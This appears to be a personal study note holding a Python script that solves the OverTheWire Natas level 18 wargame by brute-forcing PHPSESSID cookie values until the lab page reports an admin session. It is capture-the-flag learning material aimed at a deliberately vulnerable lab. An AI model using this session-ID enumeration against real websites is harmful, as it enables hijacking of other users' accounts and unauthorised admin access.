
2024-07-20 16:35

Source: #web #py

Tags: 

```
import requests
username = 'natas18'
password = '6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ'

url = 'http://natas18.natas.labs.overthewire.org/'
session = requests.Session()

for session_id in range(1,641):
    response = session.get(url,cookies = {"PHPSESSID": str(session_id)}, auth = (username,password))

    content = response.text

    if("You are an admin" in content):
        print("Got it!",session_id)
        print(content)
        break
    else:
        print("trying", session_id)
```
### TLDR


### References
https://www.youtube.com/watch?v=C9yxUTQLbRI